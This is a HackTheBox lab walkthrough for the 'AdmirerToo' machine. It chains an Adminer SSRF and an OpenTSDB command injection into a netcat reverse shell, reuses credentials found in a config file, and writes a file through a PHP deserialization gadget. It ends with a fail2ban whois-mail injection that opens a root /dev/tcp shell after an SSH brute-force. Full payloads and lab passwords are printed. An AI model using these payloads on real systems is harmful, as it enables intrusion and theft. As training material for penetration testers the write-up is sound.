---
layout: post
title: "HTB: AdmirerToo"
---

### Recon

**nmap:**
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-10 14:04 EST
Nmap scan report for 10.10.11.137
Host is up (0.028s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)
|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)
|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)
80/tcp   open     http           Apache httpd 2.4.38 ((Debian))
|_http-title: Admirer
|_http-server-header: Apache/2.4.38 (Debian)
4242/tcp filtered vrml-multi-use
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.95 seconds
```

Since port 4242 is filtered, this leaves us with yet another 22-80 situation. As always, website first!

**The Website**

![](https://cybersec.deadandbeef.com/images/AdmirerToo/MainWebsite.png)

The site seems to be a photo gallery. Before doing anything else, I like to check the file type the server is using: .php, .html, or something else. There's a 404 upon loading `index.html`, but hovering over the server IP gives an email:

![](https://cybersec.deadandbeef.com/images/AdmirerToo/404.png)

It contains the domain name of the website, which is `admirer-gallery.htb`. That means we can fuzz for subdomains, which we'll do:
```
       /'___\  /'___\           /'___\          
      /\ \__/ /\ \__/  __  __  /\ \__/          
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
        \ \_\   \ \_\  \ \____/  \ \_\          
         \/_/    \/_/   \/___/    \/_/          
  
      v1.1.0  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://admirer-gallery.htb  
:: Wordlist         : FUZZ: /home/thedoug/SecLists/Discovery/DNS/subdomains-top1million-5000.txt  
:: Header           : Host: FUZZ.admirer-gallery.htb  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200,204,301,302,307,401,403  
:: Filter           : Response size: 14099  
________________________________________________  
  
db                      [Status: 200, Size: 2569, Words: 113, Lines: 63]  
:: Progress: [4989/4989] :: Job [1/1] :: 2494 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

There's a subdomain `db.admirer-gallery.htb` to check out here. Since there's not much in terms of functionality on the main website, this could be where our way in lies.

**The DB Subdomain**

![](https://cybersec.deadandbeef.com/images/AdmirerToo/adminer.png)

The page is for a plugin called Adminer, an alternative to phpMyAdmin. Looking up the version of Adminer displayed, results return for CVE-2021-21311, a server side request forgery (SSRF) vulnerability. A prebuilt Python exploit ([here](https://github.com/llhala/CVE-2021-21311)) exists for us to take advantage of it. There's a port we weren't able to access before (4242), but it's possible that we can access this service with the SSRF.

### Foothold

The script takes three different parameters: a local address, the Adminer instance URL, and URL to access from the server. An HTTP server will be created to redirect Adminer's callback to us, which returns the contents of the URL we specify. This is what I ran:
```
sudo python3 CVE-2021-21311.py --host 10.10.14.12 --url http://db.admirer-gallery.htb --redirect http://127.0.0.1:4242
```

What's in this internal service? Fortunately, the mess of HTML we get can tell us that:
```
Running HTTP Server on 10.10.14.12:80  
[CVE-2021-21311]  
[CLIENT] 10.10.11.137:45244  
[REQUEST]  
GET / HTTP/1.0  
Authorization: Basic Og==  
Host: 10.10.14.12  
Connection: close  
Content-Length: 2  
Content-Type: application/json  
[DATA]  
[]  
[SSRF Response]  
<!DOCTYPE html><html><head><meta http-equiv=content-type content="text/html;charset=utf-8"><title>OpenTSDB</title>  
<style><!--  
body{font-family:arial,sans-serif;margin-left:2em}A.l:link{color:#6f6f6f}A.u:link{color:green}.fwf{font-family:monospace;white-space:pre-wrap}//--></style><script type=text/jav  
ascript language=javascript src=s/queryui.nocache.js></script></head>  
<body text=#000000 bgcolor=#ffffff><table border=0 cellpadding=2 cellspacing=0 width=100%><tr><td rowspan=3 width=1% nowrap><img src=s/opentsdb_header.jpg><td>&nbsp;</td></tr><  
tr><td><font color=#507e9b><b></b></td></tr><tr><td>&nbsp;</td></tr></table><div id=queryuimain></div><noscript>You must have JavaScript enabled.</noscript><iframe src=javascri  
pt:'' id=__gwt_historyFrame tabIndex=-1 style=position:absolute;width:0;height:0;border:0></iframe><table width=100% cellpadding=0 cellspacing=0><tr><td class=subg><img alt=""  
width=1 height=6></td></tr></table></body></html>
```

It is OpenTSDB from what it seems, a time series database written in Java. On the API documentation, there is a [page](http://opentsdb.net/docs/build/html/api_http/version.html) about an endpoint that displays the version: `/api/version`. Loading this through our SSRF, the following response comes back:
```
{"short_revision":"14ab3ef","repo":"/home/hobbes/OFFICIAL/build","host":"clhbase","version":"2.4.0","full_revision":"14ab3ef8a865816cf920aa69f2e019b7261a7847","repo_status":"MI  
NT","user":"hobbes","branch":"master","timestamp":"1545014415"}
```

OpenTSDB 2.4.0 is installed on the server, and there is a user `hobbes` too; could be useful later. Searching this version online, results return for CVE-2020-35476, a remote execution vulnerability through one of the graphing parameters. Details and instructions on how to perform the exploit are [here](https://github.com/vulhub/vulhub/blob/master/opentsdb/CVE-2020-35476/README.md). First, we need a metric to graph statistics on. Sending a request to `/api/suggest?type=metrics&q=&max=10` will (hopefully) find us at least one; spoiler alert, it does.
```
["http.stats.web.hits"]
```

Then, we have to make a GET request in this form:
```
q?start=2000/10/21-00:00:00&m=sum:<stat>&o=&ylabel=&xrange=10:10&yrange=[0:system(%27<url encoded command>%27)]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
```

To test out the exploit, I'll send the command `ping -c 1 <IP>` and keep track of pings sent to my machine with `tcpdump -i tun0 icmp`. The full request URI is right here:
```
http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&m=sum:<stat>&o=&ylabel=&xrange=10:10&yrange=[0:system(%27ping%20-c%201%2010.10.14.12%27)]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
```

Less than a second later, our tcpdump reports a hit!
```
17:54:38.117985 IP admirer-gallery.htb > TRYHARDER: ICMP echo request, id 3257, seq 1, length 64  
17:54:38.118014 IP TRYHARDER > admirer-gallery.htb: ICMP echo reply, id 3257, seq 1, length 64
```

Now, it's a matter of the classic mkfifo reverse shell command (plus netcat).
```
sudo python3 CVE-2021-21311.py --host 10.10.14.12 --url http://db.admirer-gallery.htb --redirect 'http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&  
m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[0:system(%27rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.12%209999%20  
%3E%2Ftmp%2Ff%27)]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
```

Above is the final exploit command I ran to obtain the shell. Replace the IP and port accordingly.

### User

From the prompt, we can see that we're logged in as the OpenTSDB user at the moment:
```
opentsdb@admirertoo:/$
```

Checking the source of the exploit (adminer) and glazing over its web directory, we can see the MySQL password that it uses to log us into the database:
```
opentsdb@admirertoo:/var/www/adminer/plugins/data$ cat servers.php    
<?php  
return [  
 'localhost' => array(  
//    'username' => 'admirer',  
//    'pass'     => 'bQ3u7^AxzcB7qAsxE3',  
// Read-only account for testing  
   'username' => 'admirer_ro',  
   'pass'     => '1w4nn4b3adm1r3d2!',  
   'label'    => 'MySQL',  
   'databases' => array(  
     'admirer' => 'Admirer DB',  
   )  
 ),  
];
```

Oh, wow! There's an extra password we can potentially take advantage of. Are there any users on this box to log into? Let's find out with `/etc/passwd`:
```
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin  
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin  
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin  
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin  
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin  
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin  
opentsdb:x:1000:1000::/usr/share/opentsdb:/bin/false  
hbase:x:1001:1001::/opt/hbase/:/sbin/nologin  
mysql:x:105:114:MySQL Server,,,:/nonexistent:/bin/false  
jennifer:x:1002:100::/home/jennifer:/bin/bash  
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin  
Debian-exim:x:107:113::/var/spool/exim4:/usr/sbin/nologin  
devel:x:1003:1003::/home/devel:/sbin/nologin
```

For either jennifer or devel, we can try this password on them:
```
opentsdb@admirertoo:/var/www/adminer/plugins/data$ su jennifer  
Password:    
jennifer@admirertoo:/var/www/adminer/plugins/data$
```

That didn't take much. Now we're on the jennifer user!

### Root

Let's check on the open ports; are there more we don't know about?
```
jennifer@admirertoo:~$ ss -lntp
State                  Recv-Q                 Send-Q                                      Local Address:Port                                  Peer Address:Port                 
LISTEN                 0                      128                                               0.0.0.0:22                                         0.0.0.0:*                    
LISTEN                 0                      80                                              127.0.0.1:3306                                       0.0.0.0:*                    
LISTEN                 0                      128                                             127.0.0.1:8080                                       0.0.0.0:*                    
LISTEN                 0                      128                                    [::ffff:127.0.1.1]:16020                                            *:*                    
LISTEN                 0                      128                                                  [::]:22                                            [::]:*                    
LISTEN                 0                      128                                                     *:16030                                            *:*                    
LISTEN                 0                      128                                    [::ffff:127.0.1.1]:16000                                            *:*                    
LISTEN                 0                      50                                     [::ffff:127.0.0.1]:2181                                             *:*                    
LISTEN                 0                      128                                                     *:16010                                            *:*                    
LISTEN                 0                      128                                                     *:80                                               *:*                    
LISTEN                 0                      50                                                      *:4242                                             *:*                    
```

There's a port 8080 that is notable and should be checked out. Let's run curl on it!

**opencats**

```
jennifer@admirertoo:~$ curl http://127.0.0.1:8080  
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"  
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">  
<html>  
<head>  
<title>opencats - Login</title>  
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />  
<style type="text/css" media="all">@import "modules/login/login.css";</style>  
<script type="text/javascript" src="js/lib.js"></script>  
<script type="text/javascript" src="modules/login/validator.js"></script>  
<script type="text/javascript" src="js/submodal/subModal.js"></script>  
</head>  
<body>  
<!-- CATS_LOGIN -->  
<div id="popupMask">&nbsp;</div><div id="popupContainer"><div id="popupInner"><div id="popupTitleBar"><div id="popupTitle"></div><div id="popupControls"><img src="js/submodal/c  
lose.gif" alt="X" width="16" height="16" onclick="hidePopWin(false);" /></div></div><div style="width: 100%; height: 100%; background-color: transparent; display: none;" id="po  
pupFrameDiv"></div><iframe src="js/submodal/loading.html" style="width: 100%; height: 100%; background-color: transparent; display: none;" scrolling="auto" frameborder="0" allo  
wtransparency="true" id="popupFrameIFrame" width="100%" height="100%"></iframe></div></div><!--       <div id="headerBlock">    
<span id="mainLogo">opencats</span><br />    
<span id="subMainLogo">Applicant Tracking System</span>    
</div> -->  
<p>  
&nbsp;</p>  
<p>  
&nbsp;</p>  
<p>  
&nbsp;</p>  
<div id="contents">  
<div id="login">  
<div id="loginText">  
<div class="ctr">  
</div>  
<br />  
</div>  
<div id="formBlock">  
<img src="images/CATS-sig.gif" alt="Login" hspace="10" vspace="10" />  
<br />  
<form name="loginForm" id="loginForm" action="index.php?m=login&amp;a=attemptLogin" method="post" onsubmit="return checkLoginForm(document.loginForm);" autocomplete="off">  
<div id="subFormBlock">  
<label id="usernameLabel" for="username">Username</label><br />  
<input name="username" id="username" class="login-input-box" value="" />  
<br />  
<label id="passwordLabel" for="password">Password</label><br />  
<input type="password" name="password" id="password" class="login-input-box" />  
<br />  
<input type="submit" class="button" value="Login" />  
<input type="reset"  id="reset" name="reset"  class="button" value="Reset" />  
<br /><br />  
</div>  
</form>  
<span style="line-height: 30px;font-size: 10px;padding-LEFT: 10px;">Version 0.9.5.2</span>  
</div>  
<div style="clear: both;"></div>  
</div>  
<br />  
<script type="text/javascript">  
document.loginForm.username.focus();  
function demoLogin()  
{  
document.getElementById('username').value = 'john@mycompany.net';  
document.getElementById('password').value = 'john99';  
document.getElementById('loginForm').submit();  
}  
function defaultLogin()  
{  
document.getElementById('username').value = 'admin';  
document.getElementById('password').value = 'cats';  
document.getElementById('loginForm').submit();  
}  
</script>  
<p>  
&nbsp;</p>     
<p>  
&nbsp;</p>     
<span style="font-size: 12px;"><a href="http://forums.opencats.org ">opencats support forum</a></span>  
<div id="login">  
</div>  
<div id="footerBlock">  
<span class="footerCopyright">&copy; 2007-2020 OpenCATS.</span>  
Based upon original work and Powered by <a href="http://www.opencats.org" target="_blank">OpenCATS</a>.</div>  
</div>  
</div>  
<script type="text/javascript">  
initPopUp();  
</script>  
<script type="text/javascript">  
if (navigator.cookieEnabled)  
{  
var cookieEnabled = true;  
}  
else  
{  
var cookieEnabled = false;  
}  
if (typeof(navigator.cookieEnabled) == "undefined" && !cookieEnabled)  
{  
document.cookie = 'testcookie';  
cookieEnabled = (document.cookie.indexOf('testcookie') != -1) ? true : false;  
}  
if (!cookieEnabled)  
{  
showPopWin('index.php?m=login&amp;a=noCookiesModal', 400, 225, null);  
}  
</script>    </body>  
</html>
```

What do we have here? An applicant tracking system by the name of OpenCats, according to the title element. It's version 0.9.5.2 as well.

In this version of OpenCATS, there's a deserialization vulnerability which can write us files (CVE-2021-25294). The original writeup outlining it (referenced on CVEdetails) is no longer present, but we can still find [it](https://web.archive.org/web/20210125175111/https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html) on the Internet Archive. We'll be referencing it quite a bit.

First of all, it'd be useful to know who we're running as when we write with OpenCATS. Its configuration file should contain information of importance:
```
jennifer@admirertoo:/etc/apache2-opencats$ cat apache2.conf | grep -v '^#' | grep .  
DefaultRuntimeDir ${APACHE_RUN_DIR}  
PidFile ${APACHE_PID_FILE}  
Timeout 300  
KeepAlive On  
MaxKeepAliveRequests 100  
KeepAliveTimeout 5  
User devel  
Group devel  
HostnameLookups Off  
ErrorLog ${APACHE_LOG_DIR}/error.log  
LogLevel warn  
IncludeOptional mods-enabled/*.load  
IncludeOptional mods-enabled/*.conf  
Include ports.conf  
<Directory />  
       Options FollowSymLinks  
       AllowOverride None  
       Require all denied  
</Directory>  
<Directory /usr/share>  
       AllowOverride None  
       Require all granted  
</Directory>  
<Directory /opt/opencats>  
       Options Indexes FollowSymLinks  
       AllowOverride None  
       Require all granted  
</Directory>  
AccessFileName .htaccess  
<FilesMatch "^\.ht">  
       Require all denied  
</FilesMatch>  
LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_c  
LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined  
LogFormat "%h %l %u %t \"%r\" %>s %O" common  
LogFormat "%{Referer}i -> %U" referer  
LogFormat "%{User-agent}i" agent  
IncludeOptional conf-enabled/*.conf  
IncludeOptional sites-enabled/*.conf
```

Alright, user devel and group devel. What can we do with this group and user in terms of writing? Let's see:
```
jennifer@admirertoo:/etc/apache2-opencats$ find / -user devel 2>/dev/null  
jennifer@admirertoo:/etc/apache2-opencats$ find / -group devel  2>/dev/null  
/opt/opencats/INSTALL_BLOCK  
/usr/local/src  
/usr/local/etc
```

Alright, so there's a few directories we can write into. We'll just note that for later. As per the writeup, `phpggc` can be employed to exploit the Guzzle file write gadget. Here's an example of what the payload would look like:
```
thehated@TRYHARDER:/dev/shm/phpggc$ ./phpggc Guzzle/FW1 /opt/opencats/upload/shell.php shell.php                
O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:41:"GuzzleHttp\Cookie\FileCookieJarfilename";s:30:"/opt/opencats/upload/shell.php";s:52:"GuzzleHttp\Cookie\FileCookieJarstoreSession  
Cookies";b:1;s:36:"GuzzleHttp\Cookie\CookieJarcookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:33:"GuzzleHttp\Cookie\SetCookiedata";a:3:{s:7:"Expires";i:1;s:7:"Discard  
";b:0;s:5:"Value";s:31:"<?php system($_GET['cmd']); ?>  
";}}}s:39:"GuzzleHttp\Cookie\CookieJarstrictMode";N;}
```

But there's not much use to this unless we know what to write and how it would help us.

**fail2ban**

F2B is installed on this machine, which is of note:
```
jennifer@admirertoo:/opt/opencats/upload$ fail2ban-client --version  
Fail2Ban v0.10.2  
  
Copyright (c) 2004-2008 Cyril Jaquier, 2008- Fail2Ban Contributors  
Copyright of modifications held by their respective authors.  
Licensed under the GNU General Public License v2 (GPL).
```

It seems like an old version, and searches for it return information about CVE-2021-32749, which involves the whois mail action and allows a command injection as root. Great, but can we exploit this? Let's see in the configuration file:
```
jennifer@admirertoo:/opt/opencats/upload$ cat /etc/fail2ban/jail.local 
[DEFAULT]
ignoreip = 127.0.0.1
bantime = 60s
destemail = root@admirertoo.htb
sender = fail2ban@admirertoo.htb
sendername = Fail2ban
mta = mail
action = %(action_mwl)s
```

`action_mwl` is the whois-mail action! This means we can exploit it, but only if we can control the whois server or perform an MITM attack. We don't exactly have to do those things; why not CREATE the server? This is where the file write comes in handy; if we find a way to make a whois configuration file that calls back to our server, we can inject the command and gain a root shell. Since there's no `/etc/whois.conf` file, we can write into `/usr/local/etc` instead and have fail2ban grab the whois config from here.

Since it's looking up our IP and we need it to call back to our server, we'll have the fornat config file look like this:
```
<IP> <IP>
```

For me, it looks like this:
```
10.10.14.12 10.10.14.12
```

Now we go onto generating the gadget chain to write this file:
```
./phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf whois.conf    
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fe  
tc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3  
A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%  
3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A24%3A%2210.10.14.12+10.10.14.12%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3B%7Di%3  
A7%3Bi%3A7%3B%7D
```

While logged into OpenCATS with jennifer's credentials, we can exploit the gadget chain through accessing a URL like this:
```
http://127.0.0.1:8080/index.php?m=activity&parametersactivity%3AActivityDataGrid=a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A24%3A%2210.10.14.12+10.10.14.12%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3B%7Di%3A7%3Bi%3A7%3B%7D
```

Our configuration file isn't how we specified it though:
```
jennifer@admirertoo:~$ cat /usr/local/etc/whois.conf    
[{"Expires":1,"Discard":false,"Value":"10.10.14.12 10.10.14.12\n"}]
```

How do we fix this? By going into how whois reads the config file, of course! Let's dive into the details.

**whois config**

The code for the `whois` executable isn't too hard to understand.
```

#ifdef CONFIG_FILE
const char *match_config_file(const char *s)
{
    FILE *fp;
    char buf[512];
    static const char delim[] = " \t";

    if ((fp = fopen(CONFIG_FILE, "r")) == NULL) {
	if (errno != ENOENT)
	    err_sys("Cannot open " CONFIG_FILE);
	return NULL;
    }

    while (fgets(buf, sizeof(buf), fp) != NULL) {
	char *p;
	const char *pattern, *server;
#ifdef HAVE_REGEXEC
	int i;
	regex_t re;
#endif

	if ((p = strpbrk(buf, "\r\n")))
	    *p = '\0';
```

This code snippet is the basis of how a config file is read by `whois`. It reads in 512 bytes at a time and moves onto the next line if there is a carriage return followed by a line feed. But wait; there's a max buffer size of 512 bytes? Also, two fields need to be on each line: the regex and server.  We can't have a third field, can we? So what we do is overrun the buffer and make it disregard the closing characters that are appended. Easiest way to do that is with some extra spaces. They never hurt anyone :P

Refactoring our gadget chain with some extra space, that's exactly what we get:
```
thehated@TRYHARDER:/dev/shm/phpggc$ ./phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf whois.conf    
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fe  
tc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3  
A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%  
3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A516%3A%22%22%7D%5D%2A10.10.14.12+10.10.14.12++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++  
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++  
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++  
++++++++++++++++++++++++++++++++++++++++++++++++++++++++%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3B%7Di%3A7%3Bi%3A7%3B%7D
```

Lots of pluses, but that's exactly what this'll be.

**chaining the final exploit**

Once we replace the original gadget chain and visit the URL, let's see about our config file!
```
jennifer@admirertoo:~$ cat /usr/local/etc/whois.conf    
[{"Expires":1,"Discard":false,"Value":"\"}]*10.10.14.12 10.10.14.12                                                                                                               
                                                                                                                                                                                 
                                                                                                                                                                                 
                          \n"}]jennifer@admirertoo:~$
```

Okay, that's awesome. But does it work when we look up our IP? `whois` can help us test that. The Whois protocol runs on port 43/tcp normally, so let's set that up on our machine with `sudo nc -lnvp 43`. To look up our IP, it's simply `whois <IP>`.
```
thehated@TRYHARDER:/dev/shm/phpggc$ sudo nc -lnvp 43  
[sudo] password for thedoug:    
Ncat: Version 7.80 ( https://nmap.org/ncat )  
Ncat: Listening on :::43  
Ncat: Listening on 0.0.0.0:43  
Ncat: Connection from 10.10.11.137.  
Ncat: Connection from 10.10.11.137:34520.  
10.10.14.12
```

Indeed, we get a callback! And by taking advantage of the `mail` tilde escape functionality (`~! [command]`), we can have commands executed as root. Fail2ban runs as root, so the email program should be run with those privileges too. Here we go...
```
thehated@TRYHARDER:/dev/shm/phpggc$ echo -ne '~! bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"' | sudo nc -lnvp 43  
Ncat: Version 7.80 ( https://nmap.org/ncat )  
Ncat: Listening on :::43  
Ncat: Listening on 0.0.0.0:43
```

^ The main 'whois' server (because it really isn't one).

```
thehated@TRYHARDER:/dev/shm$ hydra -I -l jennifer -P ~/SecLists/Passwords/Leaked-Databases/rockyou.txt ssh://admirer-gallery.htb
```

^ Brute forcing SSH in order to have it ban us, which will send that email using our hacked whois configuration.

```
thehated@TRYHARDER:/dev/shm/phpggc$ nc -lnvp <PORT> 
Ncat: Version 7.80 ( https://nmap.org/ncat )  
Ncat: Listening on :::<PORT>  
Ncat: Listening on 0.0.0.0:<PORT>
```

^ A catcher for our reverse shell.

Let the hydra rip!! After just a few seconds of it in action, we get our sweet victory:
```
thehated@TRYHARDER:/dev/shm/phpggc$ nc -lnvp 9999  
Ncat: Version 7.80 ( https://nmap.org/ncat )  
Ncat: Listening on :::9999  
Ncat: Listening on 0.0.0.0:9999  
Ncat: Connection from 10.10.11.137.  
Ncat: Connection from 10.10.11.137:35514.  
bash: cannot set terminal process group (10871): Inappropriate ioctl for device  
bash: no job control in this shell  
root@admirertoo:/#
```

The cacophany of exploits and catches to achieve it wasn't easy, but we still persevered right through. It's all about chaining those exploits together. We ball!